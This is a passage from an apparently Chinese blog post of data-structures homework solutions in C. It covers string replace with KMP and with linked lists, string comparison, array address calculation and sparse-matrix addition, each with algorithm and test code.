t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length-t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = i<span class="number">-1</span>;m &lt; s-&gt;length;m++)</span><br><span class="line">                    s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length - t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i = i+t2.length - t1.length;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> str[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;seqstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求模式 next 函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getnext</span><span class="params">(seqstring p,<span class="keyword">int</span> next[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; p.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">-1</span> || p.str[i] == p.str[j])&#123;</span><br><span class="line">            ++i;</span><br><span class="line">            ++j;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//replace 运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replace</span><span class="params">(seqstring *s,seqstring t1,seqstring t2,<span class="keyword">int</span> next[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,c,m;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; s-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">-1</span> || s-&gt;str[i] == t1.str[j])</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j == t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            c = i-t1.length;</span><br><span class="line">            <span class="keyword">if</span>(t1.length == t2.length)</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(t1.length &lt; t2.length)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = s-&gt;length<span class="number">-1</span>;m &gt; i<span class="number">-1</span>;m--)</span><br><span class="line">                    s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k &lt; t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length-t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = i<span class="number">-1</span>;m &lt; s-&gt;length;m++)</span><br><span class="line">                    s-&gt;str[m-t1.length + t2.length] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">                s-&gt;length = s-&gt;length - t1.length + t2.length;</span><br><span class="line">                s-&gt;str[s-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i = i+t2.length - t1.length;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> next[MAXSIZE];</span><br><span class="line">    seqstring s,t1,t2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 s：&quot;</span>);</span><br><span class="line">    gets(s.str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 t1：&quot;</span>);</span><br><span class="line">    gets(t1.str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 t2：&quot;</span>);</span><br><span class="line">    gets(t2.str);</span><br><span class="line">    s.length = <span class="built_in">strlen</span>(s.str);</span><br><span class="line">    t1.length = <span class="built_in">strlen</span>(t1.str);</span><br><span class="line">    t2.length = <span class="built_in">strlen</span>(t2.str);</span><br><span class="line">    getnext(t1,next);</span><br><span class="line">    replace(&amp;s,t1,t2,next);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;替换后的结果是：&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(s.str);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/22/HVelDLsqSZ78iAB.png" alt="image-20211022190113984"></p>
<h2 id="3-编写一个函数，实现在链式存储方式下字符串的-replace-S-T1-T2"><a href="#3-编写一个函数，实现在链式存储方式下字符串的-replace-S-T1-T2" class="headerlink" title="3. 编写一个函数，实现在链式存储方式下字符串的 replace(S,T1,T2)"></a>3. 编写一个函数，实现在链式存储方式下字符串的 <code>replace(S,T1,T2)</code></h2><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//replace 函数</span></span><br><span class="line"><span class="function">linkstring <span class="title">replace</span><span class="params">(linkstring S,linkstring T1,linkstring T2)</span></span>&#123;</span><br><span class="line">    linkstring p,q,r,s,pre,temp,pos;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (S == <span class="literal">NULL</span>|| T1 == <span class="literal">NULL</span> )  <span class="comment">//若 S 为空或 T1 为空,则原串不变</span></span><br><span class="line">        <span class="keyword">return</span> S; </span><br><span class="line">    pre = <span class="literal">NULL</span>;</span><br><span class="line">    pos = S; <span class="comment">/*pos 表示可能的 T1 串在 S 中的起始位置*/</span></span><br><span class="line">    <span class="keyword">while</span> (pos &amp;&amp; flag)</span><br><span class="line">    &#123;</span><br><span class="line">        p = pos;</span><br><span class="line">        q = T1;</span><br><span class="line">        <span class="keyword">while</span>(p &amp;&amp; q)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;data == q-&gt;data)&#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">                q = q-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre = pos;</span><br><span class="line">                pos = pos-&gt;next;</span><br><span class="line">                p = pos;</span><br><span class="line">                q = T1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            r = pos;</span><br><span class="line">            <span class="keyword">while</span>(r != p)</span><br><span class="line">            &#123;</span><br><span class="line">                s = r;</span><br><span class="line">                r = r-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(T2 != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                temp = r = copy(T2);</span><br><span class="line">                <span class="keyword">while</span>(r-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">                    r = r-&gt;next;</span><br><span class="line">                r-&gt;next = p;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = temp;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pre-&gt;next = temp;</span><br><span class="line">                pre = r;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = p;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    pre-&gt;next = p;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linkstrnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> linkstrnode *linkstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建单链表  尾插法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">strcreate</span><span class="params">(linkstring *S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    linkstrnode *p,*r;</span><br><span class="line">    *S = <span class="literal">NULL</span>;</span><br><span class="line">    r = <span class="literal">NULL</span>; <span class="comment">//r始终指向当前链式串最后一个字符对应的结点</span></span><br><span class="line">    <span class="keyword">while</span>((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (linkstrnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linkstrnode));</span><br><span class="line">        p-&gt;data = ch;</span><br><span class="line">        <span class="keyword">if</span>(*S == <span class="literal">NULL</span>) <span class="comment">//本为空表</span></span><br><span class="line">            *S = p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = p; <span class="comment">//不为空表</span></span><br><span class="line">        r = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>; <span class="comment">//处理尾结点指针域</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(linkstring head)</span></span>&#123;</span><br><span class="line">    linkstrnode *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单链表拷贝函数</span></span><br><span class="line"><span class="function">linkstring <span class="title">copy</span><span class="params">(linkstring head)</span></span>&#123;</span><br><span class="line">    linkstring L = <span class="literal">NULL</span>,r = <span class="literal">NULL</span>,s,p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        s = (linkstring)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linkstrnode));</span><br><span class="line">        s-&gt;data = p-&gt;data;</span><br><span class="line">        <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">            L = r = s;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r-&gt;next = s;</span><br><span class="line">            r = s;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r!= <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//replace 函数</span></span><br><span class="line"><span class="function">linkstring <span class="title">replace</span><span class="params">(linkstring S,linkstring T1,linkstring T2)</span></span>&#123;</span><br><span class="line">    linkstring p,q,r,s,pre,temp,pos;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (S == <span class="literal">NULL</span>|| T1 == <span class="literal">NULL</span> )  <span class="comment">//若 S 为空或 T1 为空,则原串不变</span></span><br><span class="line">        <span class="keyword">return</span> S; </span><br><span class="line">    pre = <span class="literal">NULL</span>;</span><br><span class="line">    pos = S; <span class="comment">/*pos 表示可能的 T1 串在 S 中的起始位置*/</span></span><br><span class="line">    <span class="keyword">while</span> (pos &amp;&amp; flag)</span><br><span class="line">    &#123;</span><br><span class="line">        p = pos;</span><br><span class="line">        q = T1;</span><br><span class="line">        <span class="keyword">while</span>(p &amp;&amp; q)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;data == q-&gt;data)&#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">                q = q-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre = pos;</span><br><span class="line">                pos = pos-&gt;next;</span><br><span class="line">                p = pos;</span><br><span class="line">                q = T1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(q != <span class="literal">NULL</span>)</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            r = pos;</span><br><span class="line">            <span class="keyword">while</span>(r != p)</span><br><span class="line">            &#123;</span><br><span class="line">                s = r;</span><br><span class="line">                r = r-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(T2 != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                temp = r = copy(T2);</span><br><span class="line">                <span class="keyword">while</span>(r-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">                    r = r-&gt;next;</span><br><span class="line">                r-&gt;next = p;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = temp;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pre-&gt;next = temp;</span><br><span class="line">                pre = r;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(pre == <span class="literal">NULL</span>)</span><br><span class="line">                    S = p;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    pre-&gt;next = p;</span><br><span class="line">                pos = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    linkstring S,T1,T2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 S：&quot;</span>);</span><br><span class="line">    strcreate(&amp;S); </span><br><span class="line">    print(S);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入 T1：&quot;</span>);</span><br><span class="line">    strcreate(&amp;T1);</span><br><span class="line">    print(T1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入 T2：&quot;</span>);</span><br><span class="line">    strcreate(&amp;T2); </span><br><span class="line">    print(T2);</span><br><span class="line">    S=replace(S,T1,T2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n替换后的结果为：\n&quot;</span>);</span><br><span class="line">    print(S); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/22/6KrmNXFv4JglMCu.png" alt="image-20211022192220114"></p>
<h2 id="4-编写一个函数，实现在-顺序存储方式-下字符串的-strcompare-S1-S2"><a href="#4-编写一个函数，实现在-顺序存储方式-下字符串的-strcompare-S1-S2" class="headerlink" title="4. 编写一个函数，实现在 顺序存储方式 下字符串的 strcompare(S1,S2)"></a>4. 编写一个函数，实现在 <code>顺序存储方式</code> 下字符串的 <code>strcompare(S1,S2)</code></h2><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//strcompare 函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(seqstring s1,seqstring s2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,m = <span class="number">0</span>,len;</span><br><span class="line">    len = s1.length&lt;s2.length?s1.length:s2.length;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=len;i++)</span><br><span class="line">        <span class="keyword">if</span>(s1.str[i] &gt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span> <span class="keyword">if</span>(s1.str[i] &lt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> str[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;seqstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">//strcompare 函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(seqstring s1,seqstring s2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,m = <span class="number">0</span>,len;</span><br><span class="line">    len = s1.length&lt;s2.length?s1.length:s2.length;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=len;i++)</span><br><span class="line">        <span class="keyword">if</span>(s1.str[i] &gt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span> <span class="keyword">if</span>(s1.str[i] &lt; s2.str[i])</span><br><span class="line">        &#123;</span><br><span class="line">            m = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    seqstring s1,s2;</span><br><span class="line">    <span class="keyword">int</span> i,m;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 s1：\n&quot;</span>);</span><br><span class="line">    gets(s1.str);</span><br><span class="line">    s1.length=<span class="built_in">strlen</span>(s1.str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入 s2：\n&quot;</span>);</span><br><span class="line">    gets(s2.str);</span><br><span class="line">    s2.length = <span class="built_in">strlen</span>(s2.str);</span><br><span class="line">    m = strcompare(s1,s2);</span><br><span class="line">    <span class="keyword">if</span>(m == <span class="number">1</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 &gt; s2\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(m == <span class="number">-1</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s2 &gt; s1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(m == <span class="number">0</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 == s2\n&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/22/xDUM8zHKQPw4Vd7.png" alt="image-20211022193108256"></p>
<h2 id="5-已知三维数组-A-3-2-4-，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素-A-0-1-2-在-按行优先-和-按列优先-存储方式下的地址"><a href="#5-已知三维数组-A-3-2-4-，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素-A-0-1-2-在-按行优先-和-按列优先-存储方式下的地址" class="headerlink" title="5. 已知三维数组 A[3][2][4]，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素 A[0][1][2]在 按行优先 和 按列优先 存储方式下的地址"></a>5. 已知三维数组 <code>A[3][2][4]</code>，数组首地址为100，每个元素占用1个存储单元，分别计算数组元素 <code>A[0][1][2]</code>在 <code>按行优先</code> 和 <code>按列优先</code> 存储方式下的地址</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">A[<span class="number">0</span>][<span class="number">1</span>][<span class="number">2</span>]按行优先方式在内存的存储地址为：<span class="number">100</span>+<span class="number">0</span>*<span class="number">8</span>+<span class="number">1</span>*<span class="number">4</span>+<span class="number">2</span>=<span class="number">106</span></span><br><span class="line">A[<span class="number">0</span>][<span class="number">1</span>][<span class="number">2</span>]按列优先方式在内存的储储地址为：<span class="number">100</span>+<span class="number">2</span>*<span class="number">6</span>+<span class="number">1</span>*<span class="number">3</span>+<span class="number">0</span>*<span class="number">8</span>=<span class="number">115</span> </span><br></pre></td></tr></table></figure>

<h2 id="6-已知两个-稀疏矩阵-A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用-三元组-表示。"><a href="#6-已知两个-稀疏矩阵-A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用-三元组-表示。" class="headerlink" title="6. 已知两个 稀疏矩阵 A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用 三元组 表示。"></a>6. 已知两个 <code>稀疏矩阵</code> A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用 <code>三元组</code> 表示。</h2><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//三元组：矩阵相加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(spmatrix a,spmatrix b,spmatrix c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,t,r;</span><br><span class="line">    i = j = k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=a[<span class="number">0</span>][<span class="number">2</span>]&amp;&amp;j&lt;=b[<span class="number">0</span>][<span class="number">2</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>] &lt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>]&lt;b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">             c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">             c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">             c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">             i++;k++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] &gt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>] &gt; b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">                c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">                c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">                c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">                j++;k++;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; (a[i][<span class="number">1</span>] == b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">            c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>]; </span><br><span class="line">            c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">            c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>]+b[j][<span class="number">2</span>];</span><br><span class="line">            i++;j++;</span><br><span class="line">            <span class="keyword">if</span>(c[k][<span class="number">2</span>] != <span class="number">0</span>) k++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j &lt;= b[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">        j++;k++; </span><br><span class="line">    &#125;</span><br><span class="line"> 	<span class="keyword">while</span>(i &lt;= a[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">        i++;k++; </span><br><span class="line">    &#125;</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">0</span>]=a[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">1</span>]=a[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">2</span>]=k<span class="number">-1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> m,n; <span class="comment">//稀疏矩阵 行数、列数、非零元素的个数</span></span><br><span class="line">&#125;matrix;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> spmatrix[<span class="number">100</span>][<span class="number">3</span>];</span><br><span class="line">spmatrix c;</span><br><span class="line"></span><br><span class="line"><span class="comment">//三元组：矩阵相加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(spmatrix a,spmatrix b,spmatrix c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,t,r;</span><br><span class="line">    i = j = k = <span class="number">1</span>;</span><br><span class="line">    <span 